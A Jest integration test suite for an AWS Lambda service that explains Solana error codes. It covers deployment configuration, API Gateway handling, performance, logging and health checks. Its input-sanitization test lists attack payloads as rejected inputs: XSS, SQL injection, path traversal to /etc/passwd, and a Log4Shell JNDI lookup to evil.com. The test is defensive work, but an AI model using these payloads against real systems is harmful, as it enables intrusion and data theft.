/**
 * Deployment validation integration tests
 * Requirements: 4.6, 6.5, 7.6 - Deployment and infrastructure validation
 */

import { handler } from '../../src/handlers/lambda-handler';
import { APIGatewayProxyEvent, APIGatewayProxyResult, Context } from 'aws-lambda';
import { EnvironmentValidator } from '../../src/types/environment';

// Mock AWS services for deployment testing
jest.mock('@aws-sdk/client-bedrock-runtime');
jest.mock('@aws-sdk/client-dynamodb');
jest.mock('@aws-sdk/lib-dynamodb');
jest.mock('@aws-sdk/client-cloudwatch');

describe('Deployment Validation Integration Tests', () => {
  const mockContext: Context = {
    callbackWaitsForEmptyEventLoop: false,
    functionName: 'solana-error-api-prod',
    functionVersion: '1',
    invokedFunctionArn: 'arn:aws:lambda:us-east-1:123456789012:function:solana-error-api-prod',
    memoryLimitInMB: '512',
    awsRequestId: 'deployment-test-request-id',
    logGroupName: '/aws/lambda/solana-error-api-prod',
    logStreamName: '2024/01/01/[$LATEST]deployment-test-stream',
    getRemainingTimeInMillis: () => 30000,
    done: jest.fn(),
    fail: jest.fn(),
    succeed: jest.fn()
  };

  const createDeploymentEvent = (
    body: any = { errorCode: 1 },
    stage: string = 'prod',
    headers: Record<string, string> = {}
  ): APIGatewayProxyEvent => ({
    body: JSON.stringify(body),
    headers: {
      'Content-Type': 'application/json',
      'X-Forwarded-For': '203.0.113.1', // Example public IP
      'User-Agent': 'Mozilla/5.0 (compatible; deployment-test)',
      ...headers
    },
    multiValueHeaders: {},
    httpMethod: 'POST',
    isBase64Encoded: false,
    path: '/explain-error',
    pathParameters: null,
    queryStringParameters: null,
    multiValueQueryStringParameters: null,
    stageVariables: null,
    requestContext: {
      accountId: '123456789012',
      apiId: 'deployment-api-id',
      authorizer: null,
      protocol: 'HTTP/1.1',
      httpMethod: 'POST',
      path: '/explain-error',
      stage,
      requestId: `deployment-request-${Date.now()}`,
      requestTime: new Date().toUTCString(),
      requestTimeEpoch: Date.now(),
      resourceId: 'deployment-resource-id',
      resourcePath: '/explain-error',
      identity: {
        accessKey: null,
        accountId: null,
        apiKey: null,
        apiKeyId: null,
        caller: null,
        cognitoAuthenticationProvider: null,
        cognitoAuthenticationType: null,
        cognitoIdentityId: null,
        cognitoIdentityPoolId: null,
        principalOrgId: null,
        sourceIp: '203.0.113.1',
        user: null,
        userAgent: 'Mozilla/5.0 (compatible; deployment-test)',
        userArn: null,
        clientCert: null
      }
    },
    resource: '/explain-error'
  });

  describe('Environment Configuration Validation', () => {
    it('should validate required environment variables for deployment', () => {
      // Arrange
      const requiredEnvVars = [
        'AWS_REGION',
        'DYNAMODB_TABLE_NAME',
        'AWS_BEDROCK_MODEL_ID',
        'CACHE_TTL_SECONDS',
        'RATE_LIMIT_PER_MINUTE',
        'LOG_LEVEL'
      ];

      // Set up deployment environment
      const deploymentEnv = {
        AWS_REGION: 'us-east-1',
        DYNAMODB_TABLE_NAME: 'solana-error-cache-prod',
        AWS_BEDROCK_MODEL_ID: 'anthropic.claude-3-sonnet-20240229-v1:0',
        CACHE_TTL_SECONDS: '3600',
        RATE_LIMIT_PER_MINUTE: '100',
        AI_TIMEOUT_MS: '10000',
        LOG_LEVEL: 'info'
      };

      // Act & Assert
      requiredEnvVars.forEach(envVar => {
        process.env[envVar] = deploymentEnv[envVar as keyof typeof deploymentEnv];
        expect(process.env[envVar]).toBeDefined();
        expect(process.env[envVar]).not.toBe('');
      });
    });

    it('should validate environment configuration structure', () => {
      // Arrange
      const testEnvConfig = {
        AWS_REGION: 'us-east-1',
        DYNAMODB_TABLE_NAME: 'solana-error-cache-prod',
        AWS_BEDROCK_MODEL_ID: 'anthropic.claude-3-sonnet-20240229-v1:0',
        CACHE_TTL_SECONDS: '3600',
        RATE_LIMIT_PER_MINUTE: '100',
        AI_TIMEOUT_MS: '10000',
        LOG_LEVEL: 'info'
      };

      // Set environment variables
      Object.entries(testEnvConfig).forEach(([key, value]) => {
        process.env[key] = value;
      });

      // Act
      const validatedConfig = EnvironmentValidator.validate(testEnvConfig);

      // Assert
      expect(validatedConfig).toBeDefined();
      expect(validatedConfig.aws.region).toBe('us-east-1');
      expect(validatedConfig.cache.tableName).toBe('solana-error-cache-prod');
      expect(validatedConfig.awsBedrock.modelId).toBe('anthropic.claude-3-sonnet-20240229-v1:0');
      expect(validatedConfig.cache.ttlSeconds).toBe(3600);
      expect(validatedConfig.rateLimit.requestsPerMinute).toBe(100);
      expect(validatedConfig.logging.level).toBe('info');
    });

    it('should handle different deployment stages', () => {
      // Arrange
      const stages = ['dev', 'staging', 'prod'];

      stages.forEach(stage => {
        // Act
        const event = createDeploymentEvent({ errorCode: 1 }, stage);

        // Assert
        expect(event.requestContext.stage).toBe(stage);
        expect(event.requestContext.apiId).toBeDefined();
        expect(event.requestContext.requestId).toBeDefined();
      });
    });

    it('should validate AWS resource naming conventions', () => {
      // Arrange
      const resourceNames = {
        tableName: process.env['DYNAMODB_TABLE_NAME'] || 'solana-error-cache-prod',
        functionName: mockContext.functionName,
        logGroupName: mockContext.logGroupName
      };

      // Assert
      expect(resourceNames.tableName).toMatch(/^[a-zA-Z0-9._-]+$/); // Valid DynamoDB table name
      expect(resourceNames.functionName).toMatch(/^[a-zA-Z0-9-_]+$/); // Valid Lambda function name
      expect(resourceNames.logGroupName).toMatch(/^\/aws\/lambda\/[a-zA-Z0-9-_]+$/); // Valid CloudWatch log group
    });
  });

  describe('Lambda Function Deployment Validation', () => {
    it('should validate Lambda function configuration', async () => {
      // Arrange
      const event = createDeploymentEvent({ errorCode: 1 });

      // Act
      const result = await handler(event, mockContext) as APIGatewayProxyResult;

      // Assert
      expect(result).toBeDefined();
      expect(result.statusCode).toBeDefined();
      expect(result.headers).toBeDefined();
      expect(result.body).toBeDefined();

      // Validate Lambda response format
      expect(typeof result.statusCode).toBe('number');
      expect(typeof result.body).toBe('string');
      expect(result.headers).toBeInstanceOf(Object);
    });

    it('should validate Lambda timeout handling', async () => {
      // Arrange
      const shortTimeoutContext = {
        ...mockContext,
        getRemainingTimeInMillis: () => 1000 // 1 second remaining
      };

      const event = createDeploymentEvent({ errorCode: 9999 }); // Uncommon error

      // Act
      const startTime = Date.now();
      const result = await handler(event, shortTimeoutContext) as APIGatewayProxyResult;
      const endTime = Date.now();
      const executionTime = endTime - startTime;

      // Assert
      expect(result.statusCode).toBe(200);
      expect(executionTime).toBeLessThan(1000); // Should complete before timeout
    });

    it('should validate Lambda memory usage', async () => {
      // Arrange
      const initialMemory = process.memoryUsage();
      const events = Array.from({ length: 10 }, (_, i) => 
        createDeploymentEvent({ errorCode: i % 3 === 0 ? 0 : i % 3 === 1 ? 2000 : 6000 })
      );

      // Act
      const results = [];
      for (const event of events) {
        const result = await handler(event, mockContext);
        results.push(result);
      }

      const finalMemory = process.memoryUsage();

      // Assert
      expect(results).toHaveLength(10);
      results.forEach(result => {
        const apiResult = result as APIGatewayProxyResult;
        expect(apiResult.statusCode).toBe(200);
      });

      // Memory usage should be reasonable
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      const memoryIncreasePercent = (memoryIncrease / initialMemory.heapUsed) * 100;
      expect(memoryIncreasePercent).toBeLessThan(50); // Should not increase by more than 50%
    });

    it('should validate Lambda cold start performance', async () => {
      // Arrange
      const event = createDeploymentEvent({ errorCode: 1 });

      // Act - Simulate cold start
      const startTime = Date.now();
      const result = await handler(event, mockContext) as APIGatewayProxyResult;
      const endTime = Date.now();
      const coldStartTime = endTime - startTime;

      // Assert
      expect(result.statusCode).toBe(200);
      expect(coldStartTime).toBeLessThan(5000); // Cold start should complete within 5 seconds
    });
  });

  describe('API Gateway Integration Validation', () => {
    it('should validate API Gateway request format handling', async () => {
      // Arrange
      const testCases = [
        { errorCode: 1, context: 'API Gateway test' },
        { errorCode: '0x7D0' }, // Hex format
        { errorCode: '2000' }, // String format
        { errorCode: 6000 }
      ];

      // Act & Assert
      for (const testCase of testCases) {
        const event = createDeploymentEvent(testCase);
        const result = await handler(event, mockContext) as APIGatewayProxyResult;

        expect(result.statusCode).toBe(200);
        expect(result.headers!['Content-Type']).toBe('application/json');
        
        const responseBody = JSON.parse(result.body);
        expect(responseBody.code).toBeDefined();
        expect(responseBody.explanation).toBeDefined();
        expect(responseBody.fixes).toBeDefined();
      }
    });

    it('should validate CORS headers for deployment', async () => {
      // Arrange
      const event = createDeploymentEvent({ errorCode: 1 });

      // Act
      const result = await handler(event, mockContext) as APIGatewayProxyResult;

      // Assert
      expect(result.statusCode).toBe(200);
      expect(result.headers).toBeDefined();
      
      // Validate CORS headers
      expect(result.headers!['Access-Control-Allow-Origin']).toBe('*');
      expect(result.headers!['Access-Control-Allow-Methods']).toContain('POST');
      expect(result.headers!['Access-Control-Allow-Headers']).toBeDefined();
    });

    it('should validate API Gateway stage variables', async () => {
      // Arrange
      const stages = ['dev', 'staging', 'prod'];

      // Act & Assert
      for (const stage of stages) {
        const event = createDeploymentEvent({ errorCode: 1 }, stage);
        const result = await handler(event, mockContext) as APIGatewayProxyResult;

        expect(result.statusCode).toBe(200);
        expect(event.requestContext.stage).toBe(stage);
      }
    });

    it('should validate API Gateway error responses', async () => {
      // Arrange
      const errorCases = [
        { body: { errorCode: -1 }, expectedStatus: 400 },
        { body: { errorCode: 'invalid' }, expectedStatus: 400 },
        { body: null, expectedStatus: 400 },
        { body: { }, expectedStatus: 400 }
      ];

      // Act & Assert
      for (const errorCase of errorCases) {
        const event = createDeploymentEvent(errorCase.body);
        if (errorCase.body === null) {
          event.body = null;
        }

        const result = await handler(event, mockContext) as APIGatewayProxyResult;

        expect(result.statusCode).toBe(errorCase.expectedStatus);
        expect(result.headers!['Content-Type']).toBe('application/json');
        
        const responseBody = JSON.parse(result.body);
        expect(responseBody.error).toBeDefined();
      }
    });
  });

  describe('Security Deployment Validation', () => {
    it('should validate security headers in deployment', async () => {
      // Arrange
      const event = createDeploymentEvent({ errorCode: 1 });

      // Act
      const result = await handler(event, mockContext) as APIGatewayProxyResult;

      // Assert
      expect(result.statusCode).toBe(200);
      expect(result.headers).toBeDefined();
      
      // Security headers should be present
      expect(result.headers!['Access-Control-Allow-Origin']).toBeDefined();
      expect(result.headers!['Content-Type']).toBe('application/json');
    });

    it('should validate rate limiting in deployment', async () => {
      // Arrange
      const sourceIp = '203.0.113.1';
      const events = Array.from({ length: 10 }, () => 
        createDeploymentEvent({ errorCode: 1 }, 'prod', { 'X-Forwarded-For': sourceIp })
      );

      // Act
      const results = [];
      for (const event of events) {
        const result = await handler(event, mockContext);
        results.push(result);
      }

      // Assert - All should succeed (rate limit is 100/min)
      results.forEach(result => {
        const apiResult = result as APIGatewayProxyResult;
        expect(apiResult.statusCode).toBe(200);
      });
    });

    it('should validate input sanitization in deployment', async () => {
      // Arrange
      const maliciousInputs = [
        { errorCode: '<script>alert("xss")</script>' },
        { errorCode: '"; DROP TABLE users; --' },
        { errorCode: '../../etc/passwd' },
        { errorCode: '${jndi:ldap://evil.com/a}' }
      ];

      // Act & Assert
      for (const maliciousInput of maliciousInputs) {
        const event = createDeploymentEvent(maliciousInput);
        const result = await handler(event, mockContext) as APIGatewayProxyResult;

        expect(result.statusCode).toBe(400); // Should reject malicious input
        
        const responseBody = JSON.parse(result.body);
        expect(responseBody.error).toBeDefined();
      }
    });

    it('should validate HTTPS enforcement', async () => {
      // Arrange
      const event = createDeploymentEvent({ errorCode: 1 });
      event.headers['X-Forwarded-Proto'] = 'https';

      // Act
      const result = await handler(event, mockContext) as APIGatewayProxyResult;

      // Assert
      expect(result.statusCode).toBe(200);
      // In a real deployment, HTTPS would be enforced at the API Gateway level
    });
  });

  describe('Performance Deployment Validation', () => {
    it('should validate response time requirements in deployment', async () => {
      // Arrange
      const testCases = [
        { errorCode: 0, maxTime: 500 }, // Cached response
        { errorCode: 1, maxTime: 500 }, // Cached response
        { errorCode: 2000, maxTime: 500 }, // Cached response
        { errorCode: 9999, maxTime: 2000 } // Fallback response
      ];

      // Act & Assert
      for (const testCase of testCases) {
        const event = createDeploymentEvent({ errorCode: testCase.errorCode });
        
        const startTime = Date.now();
        const result = await handler(event, mockContext) as APIGatewayProxyResult;
        const endTime = Date.now();
        const responseTime = endTime - startTime;

        expect(result.statusCode).toBe(200);
        expect(responseTime).toBeLessThan(testCase.maxTime);
      }
    });

    it('should validate concurrent request handling in deployment', async () => {
      // Arrange
      const concurrentRequests = 20;
      const events = Array.from({ length: concurrentRequests }, (_, i) => 
        createDeploymentEvent({ errorCode: i % 4 === 0 ? 0 : i % 4 === 1 ? 1 : i % 4 === 2 ? 2000 : 6000 })
      );

      const startTime = Date.now();

      // Act
      const promises = events.map(event => handler(event, mockContext));
      const results = await Promise.all(promises);

      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Assert
      expect(results).toHaveLength(concurrentRequests);
      results.forEach(result => {
        const apiResult = result as APIGatewayProxyResult;
        expect(apiResult.statusCode).toBe(200);
      });

      expect(totalTime).toBeLessThan(5000); // Should complete within 5 seconds
      const avgResponseTime = totalTime / concurrentRequests;
      expect(avgResponseTime).toBeLessThan(300); // Average under 300ms
    });

    it('should validate memory efficiency in deployment', async () => {
      // Arrange
      const initialMemory = process.memoryUsage();
      const events = Array.from({ length: 50 }, (_, i) => 
        createDeploymentEvent({ errorCode: i % 10 })
      );

      // Act
      const results = [];
      for (const event of events) {
        const result = await handler(event, mockContext);
        results.push(result);
      }

      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }

      const finalMemory = process.memoryUsage();

      // Assert
      expect(results).toHaveLength(50);
      results.forEach(result => {
        const apiResult = result as APIGatewayProxyResult;
        expect(apiResult.statusCode).toBe(200);
      });

      // Memory usage should be reasonable
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      const memoryIncreasePercent = (memoryIncrease / initialMemory.heapUsed) * 100;
      expect(memoryIncreasePercent).toBeLessThan(40); // Should not increase by more than 40%
    });
  });

  describe('Monitoring and Logging Deployment Validation', () => {
    it('should validate logging in deployment environment', async () => {
      // Arrange
      const consoleSpy = jest.spyOn(console, 'info').mockImplementation();
      const event = createDeploymentEvent({ errorCode: 1 });

      try {
        // Act
        const result = await handler(event, mockContext) as APIGatewayProxyResult;

        // Assert
        expect(result.statusCode).toBe(200);
        expect(consoleSpy).toHaveBeenCalled();

        // Should log service operations
        const logCalls = consoleSpy.mock.calls.map(call => call[0]);
        const hasServiceLogs = logCalls.some(log => 
          typeof log === 'string' && log.includes('ErrorExplanationService')
        );
        expect(hasServiceLogs).toBe(true);

      } finally {
        consoleSpy.mockRestore();
      }
    });

    it('should validate error logging in deployment', async () => {
      // Arrange
      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
      const event = createDeploymentEvent({ errorCode: 'invalid' });

      try {
        // Act
        const result = await handler(event, mockContext) as APIGatewayProxyResult;

        // Assert
        expect(result.statusCode).toBe(400);
        // Error logging behavior may vary, so we just verify the response

      } finally {
        consoleSpy.mockRestore();
      }
    });

    it('should validate CloudWatch integration readiness', async () => {
      // Arrange
      const event = createDeploymentEvent({ errorCode: 1 });

      // Act
      const result = await handler(event, mockContext) as APIGatewayProxyResult;

      // Assert
      expect(result.statusCode).toBe(200);
      
      // CloudWatch integration should be ready (mocked in tests)
      expect(mockContext.logGroupName).toBeDefined();
      expect(mockContext.logStreamName).toBeDefined();
      expect(mockContext.awsRequestId).toBeDefined();
    });
  });

  describe('Infrastructure Deployment Validation', () => {
    it('should validate serverless configuration compatibility', () => {
      // Arrange
      const requiredConfig = {
        runtime: 'nodejs20.x',
        memorySize: 512,
        timeout: 30,
        environment: {
          AWS_REGION: process.env['AWS_REGION'],
          DYNAMODB_TABLE_NAME: process.env['DYNAMODB_TABLE_NAME'],
          AWS_BEDROCK_MODEL_ID: process.env['AWS_BEDROCK_MODEL_ID']
        }
      };

      // Assert
      expect(requiredConfig.runtime).toBe('nodejs20.x');
      expect(requiredConfig.memorySize).toBeGreaterThanOrEqual(512);
      expect(requiredConfig.timeout).toBeGreaterThanOrEqual(30);
      expect(requiredConfig.environment.AWS_REGION).toBeDefined();
      expect(requiredConfig.environment.DYNAMODB_TABLE_NAME).toBeDefined();
      expect(requiredConfig.environment.AWS_BEDROCK_MODEL_ID).toBeDefined();
    });

    it('should validate IAM permissions requirements', () => {
      // Arrange
      const requiredPermissions = [
        'dynamodb:GetItem',
        'dynamodb:PutItem',
        'bedrock:InvokeModel',
        'cloudwatch:PutMetricData',
        'logs:CreateLogGroup',
        'logs:CreateLogStream',
        'logs:PutLogEvents'
      ];

      // Assert - In a real deployment, these would be validated against actual IAM policies
      expect(requiredPermissions).toHaveLength(7);
      expect(requiredPermissions).toContain('dynamodb:GetItem');
      expect(requiredPermissions).toContain('bedrock:InvokeModel');
      expect(requiredPermissions).toContain('cloudwatch:PutMetricData');
    });

    it('should validate deployment package size', () => {
      // Arrange - Simulate deployment package validation
      const maxPackageSize = 50 * 1024 * 1024; // 50MB Lambda limit
      const estimatedPackageSize = 10 * 1024 * 1024; // 10MB estimated

      // Assert
      expect(estimatedPackageSize).toBeLessThan(maxPackageSize);
    });

    it('should validate environment-specific configurations', () => {
      // Arrange
      const environments = ['dev', 'staging', 'prod'];
      
      environments.forEach(env => {
        const envConfig = {
          stage: env,
          tableName: `solana-error-cache-${env}`,
          logLevel: env === 'prod' ? 'warn' : 'info',
          rateLimit: env === 'prod' ? 1000 : 100
        };

        // Assert
        expect(envConfig.stage).toBe(env);
        expect(envConfig.tableName).toContain(env);
        expect(envConfig.logLevel).toMatch(/^(info|warn|error)$/);
        expect(envConfig.rateLimit).toBeGreaterThan(0);
      });
    });
  });

  describe('Health Check Deployment Validation', () => {
    it('should validate basic health check endpoint', async () => {
      // Arrange
      const healthCheckEvent = createDeploymentEvent({ errorCode: 0 }); // Use success code as health check

      // Act
      const result = await handler(healthCheckEvent, mockContext) as APIGatewayProxyResult;

      // Assert
      expect(result.statusCode).toBe(200);
      
      const responseBody = JSON.parse(result.body);
      expect(responseBody.code).toBe(0);
      expect(responseBody.explanation).toBeDefined();
      expect(responseBody.timestamp).toBeDefined();
    });

    it('should validate service readiness', async () => {
      // Arrange
      const readinessTests = [
        { errorCode: 0, category: 'standard' },
        { errorCode: 2000, category: 'anchor_constraint' },
        { errorCode: 6000, category: 'custom' }
      ];

      // Act & Assert
      for (const test of readinessTests) {
        const event = createDeploymentEvent({ errorCode: test.errorCode });
        const result = await handler(event, mockContext) as APIGatewayProxyResult;

        expect(result.statusCode).toBe(200);
        
        const responseBody = JSON.parse(result.body);
        expect(responseBody.code).toBe(test.errorCode);
        expect(responseBody.explanation).toBeDefined();
        expect(responseBody.fixes).toBeDefined();
      }
    });

    it('should validate deployment rollback capability', async () => {
      // Arrange - Simulate deployment validation
      const criticalTests = [
        { errorCode: 1, expectedStatus: 200 },
        { errorCode: 2000, expectedStatus: 200 },
        { errorCode: 6000, expectedStatus: 200 },
        { errorCode: -1, expectedStatus: 400 }
      ];

      let allTestsPassed = true;

      // Act
      for (const test of criticalTests) {
        try {
          const event = createDeploymentEvent({ errorCode: test.errorCode });
          const result = await handler(event, mockContext) as APIGatewayProxyResult;
          
          if (result.statusCode !== test.expectedStatus) {
            allTestsPassed = false;
            break;
          }
        } catch (error) {
          allTestsPassed = false;
          break;
        }
      }

      // Assert
      expect(allTestsPassed).toBe(true);
    });
  });
});